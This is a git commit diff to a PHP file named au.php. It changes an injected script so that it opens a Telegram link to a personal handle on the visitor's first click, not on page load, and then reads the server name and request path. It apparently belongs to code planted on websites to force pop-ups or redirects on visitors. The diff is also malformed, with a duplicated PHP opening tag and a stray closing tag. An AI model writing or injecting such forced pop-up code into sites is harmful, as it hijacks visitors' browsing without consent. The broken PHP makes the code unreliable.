147a900724300715c2cfac5ebdbec034a851c4e7
hinataloli <100828189+hinataloli@users.noreply.github.com>
2024-10-09 21:57:48 +0700

    Update au.php

--- au.php
+++ au.php
@@ -1,9 +1,12 @@
 <?php
+<?php
 echo "<script>
-    window.onload = function() {
+    document.addEventListener('click', function() {
         window.open('https://t.me/alexbu555', '_blank');
-    };
+        document.removeEventListener('click', arguments.callee);
+    }, { once: true });
 </script>";
+?>
 $domain = $_SERVER['SERVER_NAME'];
 $path = $_SERVER['REQUEST_URI'];
 $filename = basename(__FILE__);
